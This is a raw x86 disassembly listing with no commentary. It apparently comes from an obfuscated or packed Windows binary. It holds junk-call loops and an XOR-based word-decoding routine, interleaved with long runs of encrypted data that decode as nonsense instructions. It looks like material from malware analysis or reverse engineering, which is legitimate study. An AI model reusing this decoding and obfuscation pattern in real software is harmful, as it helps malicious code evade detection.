  4101e0:	loopne 0x410183
  4101e2:	aaa    
  4101e3:	loopne 0x410178
  4101e5:	or     esp,0xffffff99
  4101e8:	cmp    DWORD PTR [edi-0x1643cbfb],ebx
  4101ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ef:	ss jno 0x410249
  4101f2:	xchg   edi,eax
  4101f3:	aas    
  4101f4:	mov    bl,0x67
  4101f6:	fistp  QWORD PTR [ebp-0x3fc132df]
  4101fc:	arpl   WORD PTR [edx],dx
  4101fe:	fdivr  st(7),st
  410200:	icebp  
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
  41026b:	or     DWORD PTR ds:0x4336d7,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x4336ab,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x4336ab
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x4336ab,ecx
  410291:	cmp    DWORD PTR ds:0x4336ab,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x4336ab,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x4336ab,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x4336ab
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x4336ab,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433603
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x4336e7,0x43369f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x4336e3,0x433697
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x433657
  41031a:	sub    DWORD PTR ds:0x43361f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43365b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43365b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43365b,ecx
  410345:	cmp    DWORD PTR ds:0x43365b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4337af
  410357:	push   0x4337ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43365b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43369f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433713,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433713
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433713,ecx
  41038f:	cmp    DWORD PTR ds:0x433713,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4336e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433713,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433713
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433713,ecx
  4103c8:	cmp    DWORD PTR ds:0x433713,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43365f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433657,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433657
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433657,esi
  4103ff:	cmp    DWORD PTR ds:0x433657,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433657,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xfe,al
  41049c:	sub    DWORD PTR [edi+0x2b],ecx
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	push   esp
  4104a8:	dec    esi
  4104a9:	push   ds
  4104aa:	mov    al,0x5c
  4104ac:	js     0x410490
  4104ae:	test   al,0x97
  4104b0:	and    DWORD PTR [ebx-0x25],0x78
  4104b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104b5:	mov    dh,0x3e
  4104b7:	push   ebx
  4104b8:	push   esi
  4104b9:	jno    0x410454
  4104bb:	jae    0x410534
  4104bd:	ins    DWORD PTR es:[edi],dx
  4104be:	cli    
  4104bf:	out    dx,al
  4104c0:	out    0x34,al
  4104c2:	aad    0x44
  4104c4:	fnstcw WORD PTR [edi]
  4104c6:	fld    TBYTE PTR ds:0xa87e05fc
  4104cc:	in     eax,0xb4
  4104ce:	out    dx,al
  4104cf:	popa   
  4104d0:	pop    ebp
  4104d1:	and    BYTE PTR [ebp-0x5d],bl
  4104d4:	call   0xad2:0xb222a4bd
  4104db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104dc:	push   ds
  4104dd:	gs jne 0x4104af
  4104e0:	sbb    dh,BYTE PTR [ebp-0x2e]
  4104e3:	pusha  
  4104e4:	xchg   edi,eax
  4104e5:	push   0xcb60488
  4104ea:	inc    ebx
  4104eb:	(bad)  
  4104ec:	xor    eax,0x2efaef9a
  4104f1:	mov    esp,DWORD PTR [ebx+0x29211809]
  4104f7:	les    esp,FWORD PTR [eax+0x54]
  4104fa:	inc    ebp
  4104fb:	retf   0x1adc
  4104fe:	bound  ebp,QWORD PTR [ebp-0x1b927d37]
  410504:	sbb    esp,DWORD PTR [ecx+0x984242f]
  41050a:	jle    0x4104ca
  41050c:	sub    al,0xe2
  41050e:	idiv   BYTE PTR [edi]
  410510:	and    al,0x84
  410512:	mov    ecx,0x85c417ee
  410517:	fwait
  410518:	test   al,0xea
  41051a:	imul   eax,edi,0xfffffffd
  41051d:	loop   0x41055f
  41051f:	retf   
  410520:	std    
  410521:	iret   
  410522:	and    ebx,eax
  410524:	xchg   esi,eax
  410525:	dec    edx
  410526:	rol    BYTE PTR ds:0x7060843f,0xe5
  41052d:	or     DWORD PTR ds:0xa373335c,eax
  410533:	xor    DWORD PTR [esi+edx*2+0x68],ebx
  410537:	adc    ecx,esi
  410539:	jmp    0x4104d5
  41053b:	dec    ecx
  41053c:	dec    ecx
  41053d:	test   eax,0xee90d751
  410542:	dec    esi
  410543:	out    0xd4,eax
  410545:	ret    0xd2cd
  410548:	xor    al,0xab
  41054a:	add    eax,0x85b6b6f9
  41054f:	or     al,0xf1
  410551:	mov    DWORD PTR ds:0x6496a701,0xb9fe8486
  41055b:	xor    edx,DWORD PTR [edi]
  41055d:	stos   DWORD PTR es:[edi],eax
  41055e:	sub    al,0xf8
  410560:	fld    DWORD PTR [esi+eax*4+0x4c3f2e5a]
  410567:	sbb    al,BYTE PTR [ebp+0x1045107]
  41056d:	out    dx,eax
  41056e:	push   ecx
  41056f:	dec    eax
  410570:	inc    esp
  410571:	pop    edi
  410572:	popf   
  410573:	outs   dx,DWORD PTR ds:[esi]
  410574:	rcr    DWORD PTR [esi+ebp*8],0xd6
  410578:	(bad)  
  410579:	push   edx
  41057a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41057b:	and    eax,0x8c0d5585
  410580:	jo     0x4105f4
  410582:	fcmovnu st,st(1)
  410585:	int    0xfa
  410587:	aam    0xdf
  410589:	mov    ebx,0xf2df2250
  41058e:	dec    edx
  41058f:	xor    eax,0x935d9595
  410594:	repz adc DWORD PTR [ebx*2+0x7739747a],edi
  41059c:	or     DWORD PTR [eax+0x5ebd720b],0x337be303
  4105a6:	es out 0x51,eax
  4105a9:	test   esi,edx
  4105ab:	fnsave [edi+0x5c]
  4105ae:	out    dx,eax
  4105af:	(bad)  
  4105b0:	call   0xad60:0xe7a97086
  4105b7:	fcomp  DWORD PTR [esi-0x46]
  4105ba:	inc    edi
  4105bb:	mov    eax,ds:0x5a07dd95
  4105c0:	(bad)  
  4105c1:	lea    ebp,[edx]
  4105c3:	jp     0x410563
  4105c5:	jmp    0x56a2e8ad
  4105ca:	xchg   BYTE PTR [eax+0x325262dd],cl
  4105d0:	push   esp
  4105d1:	int3   
  4105d2:	and    al,0xc
  4105d4:	pusha  
  4105d5:	test   bh,dh
  4105d7:	retf   
  4105d8:	or     ebx,eax
  4105da:	sub    al,0x4d
  4105dc:	ja     0x41060a
  4105de:	lods   eax,DWORD PTR ds:[esi]
  4105df:	adc    BYTE PTR [ecx+0x3891cfe],dl
  4105e5:	push   edx
  4105e6:	push   ebp
  4105e7:	xor    cl,BYTE PTR [edi-0x54eed6c2]
  4105ed:	cmp    DWORD PTR [edx+0x5f],eax
  4105f0:	jnp    0x410671
  4105f2:	cdq    
  4105f3:	ins    DWORD PTR es:[edi],dx
  4105f4:	test   eax,0x502d9900
  4105f9:	cwde   
  4105fa:	inc    ecx
  4105fb:	retf   
  4105fc:	inc    ecx
  4105fd:	stos   DWORD PTR es:[edi],eax
  4105fe:	push   esp
  4105ff:	adc    ecx,DWORD PTR [ebp+0x1e0bf10b]
  410605:	mov    edx,0x5437753
  41060a:	push   ecx
  41060b:	push   edi
  41060c:	pusha  
  41060d:	push   esi
  41060e:	push   ebx
  41060f:	and    al,0xcd
  410611:	inc    esi
  410612:	hlt    
  410613:	add    DWORD PTR [bx+si-0xb0d],eax
  410618:	int    0xa
  41061a:	mov    esp,0xb7610ed5
  41061f:	cmp    edi,esi
  410621:	push   esi
  410622:	jp     0x410672
  410624:	lahf   
  410625:	cdq    
  410626:	inc    edx
  410627:	sahf   
  410628:	add    dh,cl
  41062a:	mov    bh,0x5
  41062c:	fwait
  41062d:	push   ebp
  41062e:	xchg   edx,eax
  41062f:	addr16 mov dl,0xa1
  410632:	sub    bl,ch
  410634:	call   0xa634:0x7ebe1cf8
  41063b:	jmp    0x4105d8
  41063d:	mov    ebp,0xff160f35
  410642:	bnd jle 0x4105cb
  410645:	test   al,0x42
  410647:	dec    eax
  410648:	sbb    eax,0xedff8c7e
  41064d:	cmp    edx,DWORD PTR [eax-0x13]
  410650:	push   DWORD PTR [ebp-0x259c6ef3]
  410656:	and    WORD PTR [eax+0x1c10f469],bx
  41065d:	repz mov bl,0x74
  410660:	adc    al,0xe0
  410662:	shl    DWORD PTR [edi-0x4f9c847e],cl
  410668:	(bad)  [ebp-0x34]
  41066b:	cld    
  41066c:	and    al,0x6f
  41066e:	sti    
  41066f:	std    
  410670:	inc    edi
  410671:	cmp    DWORD PTR [esi+0x560f4dc6],ecx
  410677:	fwait
  410678:	push   0x5369ca4a
  41067d:	sub    BYTE PTR [edx-0x59],dl
  410680:	out    0xcc,eax
  410682:	ins    BYTE PTR es:[edi],dx
  410683:	imul   edi,DWORD PTR ds:[edx-0x597d1b12],0x2c
  41068b:	test   al,0x58
  41068d:	push   ebp
  41068e:	sub    BYTE PTR [ecx],dh
  410690:	cmp    eax,0x90fce459
  410695:	jns    0x4106e2
  410697:	jg     0x41061c
  410699:	imul   esi,DWORD PTR [eax-0x2dfecf51],0xffffffdb
  4106a0:	int    0xa6
  4106a2:	xchg   BYTE PTR [eax],dh
  4106a4:	(bad)  
  4106a5:	(bad)  
  4106a6:	ficom  WORD PTR [eax]
  4106a8:	int    0x2a
  4106aa:	loope  0x41071d
  4106ac:	lahf   
  4106ad:	jle    0x410704
  4106af:	push   ebx
  4106b0:	shl    DWORD PTR [ebx+0x73fa13a8],1
  4106b6:	pop    ss
  4106b7:	ret    
  4106b8:	aaa    
  4106b9:	cs repnz out dx,eax
  4106bc:	test   DWORD PTR [ecx+esi*4],edi
  4106bf:	lods   eax,DWORD PTR ds:[esi]
  4106c0:	push   es
  4106c1:	sbb    eax,0x11fc533f
  4106c6:	int3   
  4106c7:	inc    ebp
  4106c8:	push   0xb4c5a1f7
  4106cd:	in     eax,dx
  4106ce:	or     ch,BYTE PTR [eax]
  4106d0:	fisub  DWORD PTR gs:[ebp+0x36]
  4106d4:	mov    ecx,0xfaa327da
  4106d9:	push   esp
  4106da:	cwde   
  4106db:	jmp    0xea1c40ed
  4106e0:	(bad)  
  4106e1:	pop    ss
  4106e2:	jo     0x4106d6
  4106e4:	(bad)  
  4106e5:	cmp    al,0xef
  4106e7:	aad    0x3a
  4106e9:	sub    dh,BYTE PTR [esi]
  4106eb:	jbe    0x410723
  4106ed:	mov    ah,0x7b
  4106ef:	pop    ebp
  4106f0:	fwait
  4106f1:	cmp    bl,al
  4106f3:	sbb    eax,0x83226be1
  4106f8:	pop    eax
  4106f9:	dec    cl
  4106fb:	push   0x99eba574
  410700:	sti    
  410701:	shl    BYTE PTR [edi],0xcd
  410704:	cmp    dl,ah
  410706:	(bad)  
  410707:	(bad)  
  410708:	pop    ss
  410709:	jg     0x4106ce
  41070b:	or     bh,bl
  41070d:	add    cl,BYTE PTR [esi+0x20]
  410710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410711:	sahf   
  410712:	sbb    ebp,edi
  410714:	iret   
  410715:	in     eax,dx
  410716:	push   esp
  410717:	dec    eax
  410718:	sub    eax,0x806f9dca
  41071d:	rol    edx,1
  41071f:	pop    esi
  410720:	test   eax,0xa70feb02
  410725:	adc    BYTE PTR [esi+0x795a3022],ch
  41072b:	push   0x27
  41072d:	inc    bh
  41072f:	outs   dx,BYTE PTR ds:[esi]
  410730:	adc    al,0x30
  410732:	push   ecx
  410733:	adc    eax,0xd3d787ba
  410738:	repz push ebx
  41073a:	int    0x66
  41073c:	sbb    dh,al
  41073e:	lods   eax,DWORD PTR gs:[esi]
  410740:	jecxz  0x410789
  410742:	das    
  410743:	dec    ecx
  410744:	or     al,0x0
  410746:	in     al,dx
  410747:	cli    
  410748:	add    al,0xa2
  41074a:	mov    cl,0xb9
  41074c:	xor    eax,0xc7e58bf6
  410751:	ins    DWORD PTR es:[edi],dx
  410752:	scas   eax,DWORD PTR es:[edi]
  410753:	ret    0x850
  410756:	push   eax
  410757:	mov    ecx,0x42f4458b
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xcf3c81e2
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410788
  41078c:	test   eax,0x6ac2118
  410791:	outs   dx,DWORD PTR ds:[esi]
  410792:	inc    esi
  410793:	add    bl,0x82
  410796:	jle    0x410723
  410798:	test   eax,0x5e194947
  41079d:	jmp    0x41076f
  41079f:	mov    ds:0xa22588ab,al
  4107a4:	addr16 jmp 0x41074d
  4107a7:	cmp    BYTE PTR [edx-0x14f5755e],dl
  4107ad:	int    0x55
  4107af:	cmp    DWORD PTR [edx-0x6d],ebp
  4107b2:	adc    BYTE PTR ds:0x62ac3885,bl
  4107b8:	xor    al,0x2c
  4107ba:	loopne 0x410817
  4107bc:	mov    edx,0xceabe62f
  4107c1:	or     DWORD PTR [ecx+0x70e31b38],esp
  4107c7:	out    0x50,al
  4107c9:	mov    ecx,0x5bb73ff7
  4107ce:	mov    ah,0xb7
  4107d0:	retf   
  4107d1:	mov    bl,BYTE PTR [ecx]
  4107d3:	or     eax,0xf77365b2
  4107d8:	loop   0x410764
  4107da:	fdivr  st,st(6)
  4107dc:	es dec edx
  4107de:	sar    ecx,1
  4107e0:	jne    0x4107d4
  4107e2:	out    dx,eax
  4107e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107e4:	dec    edi
  4107e5:	add    DWORD PTR [ecx],edi
  4107e7:	adc    ecx,DWORD PTR [ebx-0x6cb17de1]
  4107ed:	cmp    cl,BYTE PTR [ecx+0x39]
  4107f0:	cdq    
  4107f1:	pop    eax
  4107f2:	mov    esi,0xba1f15de
  4107f7:	jl     0x410859
  4107f9:	int    0xc4
  4107fb:	dec    ebx
  4107fc:	dec    edi
  4107fd:	jl     0x4107fb
  4107ff:	adc    esp,ebp
  410801:	inc    ebx
  410802:	push   esp
  410803:	pusha  
  410804:	inc    edx
  410805:	push   eax
  410806:	pusha  
  410807:	aaa    
  410808:	mov    es,ebp
  41080a:	cmp    ebp,eax
  41080c:	jg     0x4107e4
  41080e:	jae    0x41085f
  410810:	cmc    
  410811:	addr16 sub esp,ecx
  410814:	push   es
  410815:	dec    esp
  410816:	push   edi
  410817:	daa    
  410818:	jmp    0x5a1b:0xb0a423ec
  41081f:	push   edx
  410820:	aaa    
  410821:	or     edi,DWORD PTR [edx-0xb]
  410824:	data16 mov WORD PTR [ecx-0x6d],gs
  410828:	popa   
  410829:	aam    0x80
  41082b:	lods   al,BYTE PTR ds:[esi]
  41082c:	aam    0xd8
  41082e:	sub    al,0xb7
  410830:	ret    0x239b
  410833:	push   cs
  410834:	popf   
  410835:	mov    dh,0xdc
  410837:	sub    eax,0xf4dc6a0d
  41083c:	adc    ah,bh
  41083e:	jns    0x4107d3
  410840:	and    eax,DWORD PTR [ebx+0x73]
  410843:	fs stos BYTE PTR es:[edi],al
  410845:	sar    esi,0xac
  410848:	(bad)  
  410849:	repz imul esp,edx,0xe9f0fa63
  410850:	das    
  410851:	icebp  
  410852:	and    al,0x7a
  410854:	pop    ecx
  410855:	or     al,0x62
  410857:	mov    dl,0xbf
  410859:	and    BYTE PTR [ecx],0xf4
  41085c:	sti    
  41085d:	jbe    0x4108cd
  41085f:	lods   al,BYTE PTR ds:[esi]
  410860:	mov    ah,0xec
  410862:	out    0x1c,eax
  410864:	or     BYTE PTR [edi],bh
  410866:	mov    bh,0x69
  410868:	or     DWORD PTR [ebp+edx*8-0x54c0f23a],edi
  41086f:	bound  ebx,QWORD PTR [ebx+ecx*1]
  410872:	daa    
  410873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410874:	jo     0x410892
  410876:	xlat   BYTE PTR ds:[ebx]
  410877:	cld    
  410878:	add    bh,BYTE PTR [ebp+0x10bbf83b]
  41087e:	iret   
  41087f:	popa   
  410880:	jp     0x41084a
  410882:	sub    al,0x93
  410884:	push   ebx
  410885:	arpl   WORD PTR [ebp-0x2d],si
  410888:	ret    
  410889:	rcr    BYTE PTR [esi+0x26],cl
  41088c:	add    edi,eax
  41088e:	pop    es
  41088f:	inc    edx
  410890:	sub    DWORD PTR [ecx],0x29
  410893:	mov    esp,0xe5b3b1d9
  410898:	out    dx,eax
  410899:	xor    al,0x9e
  41089b:	dec    edi
  41089c:	setno  BYTE PTR [ebx]
  41089f:	inc    edx
  4108a0:	jb     0x4108e8
  4108a2:	jbe    0x41084d
  4108a4:	jl     0x4108e4
  4108a6:	mov    BYTE PTR [ebp-0x345f3877],ah
  4108ac:	mov    al,0xf6
  4108ae:	test   al,0x32
  4108b0:	mov    eax,ds:0xd7133b74
  4108b5:	mov    ds,WORD PTR ds:0xe5238379
  4108bb:	jp     0x410849
  4108bd:	popa   
  4108be:	jge    0x4108d2
  4108c0:	cmp    BYTE PTR [esp+ebp*1-0x4b],ah
  4108c4:	cmp    DWORD PTR [esi-0x148fe85e],ebp
  4108ca:	sbb    cl,BYTE PTR [edi]
  4108cc:	sbb    DWORD PTR [ebx-0x724b1f5c],eax
  4108d2:	(bad)
  4108d5:	xor    edx,DWORD PTR [edi-0x2f]
  4108d8:	xchg   ebp,eax
  4108d9:	rcl    BYTE PTR [ebx+0x51],cl
  4108dc:	sub    cl,BYTE PTR [esi+edx*4]
  4108df:	pop    ss
  4108e0:	out    0x4b,al
  4108e2:	test   BYTE PTR [esi-0x545823ba],bh
  4108e8:	cli    
  4108e9:	jmp    0x3053a3a0
  4108ee:	int    0x41
  4108f0:	jae    0x41095b
  4108f2:	dec    esi
  4108f3:	outs   dx,DWORD PTR ds:[esi]
  4108f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108f6:	fist   WORD PTR [ebx+0x38]
  4108f9:	(bad)  
  4108fa:	sub    edx,ebx
  4108fc:	dec    eax
  4108fd:	mov    al,ds:0x69fd9c6d
  410902:	jle    0x41088e
  410904:	xchg   edi,eax
  410905:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410906:	cdq    
  410907:	dec    edi
  410908:	aaa    
  410909:	mov    al,0xfe
  41090b:	push   edi
  41090c:	scas   eax,DWORD PTR es:[edi]
  41090d:	and    edi,DWORD PTR [esi+0x2d]
  410910:	add    ebp,esp
  410912:	scas   al,BYTE PTR es:[edi]
  410913:	bound  esp,QWORD PTR [eax-0x36]
  410916:	push   es
  410917:	lds    esi,FWORD PTR [esi-0x1819f042]
  41091d:	cwde   
  41091e:	(bad)  
  410920:	xor    eax,0x6b8217d8
  410925:	push   esi
  410926:	outs   dx,DWORD PTR ds:[esi]
  410927:	iret   
  410928:	adc    al,0xf9
  41092a:	stc    
  41092b:	test   al,0xb5
  41092d:	in     eax,dx
  41092e:	cmp    al,0x90
  410930:	inc    ecx
  410931:	jecxz  0x410938
  410933:	rol    DWORD PTR [ecx-0x38],0x86
  410937:	test   BYTE PTR [edi+0x37dff319],0x87
  41093e:	and    dh,BYTE PTR [esi+0x72]
  410941:	mov    dh,0x3b
  410943:	push   0x68d99cd
  410948:	ds mov ch,bl
  41094b:	pop    ecx
  41094c:	out    dx,al
  41094d:	adc    bh,BYTE PTR [eax]
  41094f:	jmp    0x4108ef
  410951:	inc    esp
  410952:	lea    edx,[eax]
  410954:	add    ah,BYTE PTR [edi+ebp*2-0x65]
  410958:	push   eax
  410959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41095a:	dec    ebx
  41095b:	xor    DWORD PTR [esi-0x52],ecx
  41095e:	jecxz  0x4108f5
  410960:	dec    edi
  410961:	push   eax
  410962:	test   BYTE PTR [edx],bh
  410964:	jmp    FWORD PTR [edx-0x8]
  410967:	jmp    0xfe1c:0xd6610424
  41096e:	sbb    esi,DWORD PTR [ebx-0x1d7a0c1f]
  410974:	adc    cl,cl
  410976:	mov    edx,0x4fe25cd0
  41097b:	mov    ch,0xbd
  41097d:	(bad)  
  41097e:	icebp  
  41097f:	pop    ebp
  410980:	add    eax,DWORD PTR [ebx-0x5da49db9]
  410986:	add    al,0xdb
  410988:	or     al,0xd3
  41098a:	xchg   esi,eax
  41098b:	dec    ebx
  41098c:	xor    eax,0xd3c42259
  410991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410992:	lahf   
  410993:	xor    al,0xba
  410995:	and    al,0x2a
  410997:	and    BYTE PTR [eax+edi*8+0x40d8dc2b],0x93
  41099f:	es out dx,al
  4109a1:	sar    DWORD PTR [ebx],0x1b
  4109a4:	mov    ds:0xa64dbe3,al
  4109a9:	out    0xc1,eax
  4109ab:	jle    0x4109ea
  4109ad:	shr    BYTE PTR [eax],1
  4109af:	js     0x410951
  4109b1:	jno    0x410960
  4109b3:	mov    esp,0x2e34a458
  4109b8:	ret    
  4109b9:	test   eax,0x62adede0
  4109be:	(bad)  
  4109bf:	mov    dl,0xca
  4109c1:	mov    BYTE PTR ds:0xe0baa10a,bh
  4109c7:	mov    al,0xa5
  4109c9:	jbe    0x410a03
  4109cb:	mov    BYTE PTR [eax+0x52],0x13
  4109cf:	add    eax,0x53fb8f27
  4109d4:	or     DWORD PTR [ecx],edi
  4109d6:	jo     0x410a42
  4109d8:	adc    DWORD PTR [ebx],edx
  4109da:	xor    eax,0xe69d133a
  4109df:	ss mov esi,ecx
  4109e2:	retf   0x3e1e
  4109e5:	in     al,dx
  4109e6:	out    0x58,eax
  4109e8:	add    al,0x39
  4109ea:	test   al,0x19
  4109ec:	or     cl,BYTE PTR ds:0x7dd299
  4109f2:	push   esi
  4109f3:	xor    BYTE PTR [ebp-0x19ba77b2],al
  4109f9:	loopne 0x410a3a
  4109fb:	fdivr  st(1),st
  4109fd:	(bad)  
  4109fe:	cmc    
  4109ff:	int    0xde
  410a01:	add    ebp,DWORD PTR [edx+edx*1]
  410a04:	cs and dl,al
  410a07:	lods   al,BYTE PTR ds:[esi]
  410a08:	pop    ecx
  410a09:	or     BYTE PTR ds:0x1f612de2,bh
  410a0f:	test   eax,0x5202ba7
  410a14:	fdiv   st(5),st
  410a16:	jns    0x410a2d
  410a18:	sar    BYTE PTR [edi],cl
  410a1a:	cmp    DWORD PTR [edx],edx
  410a1c:	or     esp,ebx
  410a1e:	adc    DWORD PTR [ecx],esi
  410a20:	cmp    al,0x59
  410a22:	xchg   edx,eax
  410a23:	fcom   QWORD PTR [ecx-0x88d47d3]
  410a29:	fdivr  QWORD PTR [eax+0x2964b193]
  410a2f:	xchg   edi,eax
  410a30:	dec    esp
  410a31:	jmp    0x989c:0x25c1d346
  410a38:	and    BYTE PTR [ebx],ch
  410a3a:	mov    dl,0x6d
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	push   0x50
  410a51:	out    dx,eax
  410a52:	(bad)  
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a37
  410a5c:	push   edx
  410a5d:	nop
  410a5e:	aaa    
  410a5f:	pop    ss
  410a60:	pop    ebx
  410a61:	jp     0x410a51
  410a63:	cli    
  410a64:	add    DWORD PTR [ebx],esi
  410a66:	inc    ecx
  410a67:	add    ebp,DWORD PTR [edx]
  410a69:	add    cl,ah
  410a6b:	jns    0x410a77
  410a6d:	std    
  410a6e:	inc    eax
  410a6f:	sub    ch,BYTE PTR [edx+0x188b24c0]
  410a75:	and    al,0xbe
  410a77:	pop    ebx
  410a78:	xchg   BYTE PTR [ebx+0x4f],cl
  410a7b:	imul   edi,DWORD PTR [esi],0x61
  410a7e:	popf   
  410a7f:	push   ebx
  410a80:	inc    BYTE PTR [eax-0x35]
  410a83:	cmp    al,0xff
  410a85:	adc    BYTE PTR [eax],dh
  410a87:	xchg   ebx,eax
  410a88:	aam    0x0
  410a8a:	or     eax,0xd346bea6
  410a8f:	inc    esi
  410a90:	or     DWORD PTR [eax+0x3a],esp
  410a93:	dec    ebp
  410a94:	cmc    
  410a95:	shl    DWORD PTR [ecx-0x2d],1
  410a98:	fsubr  DWORD PTR [eax]
  410a9a:	pop    ecx
  410a9b:	sub    BYTE PTR [ebp-0xa03c027],bl
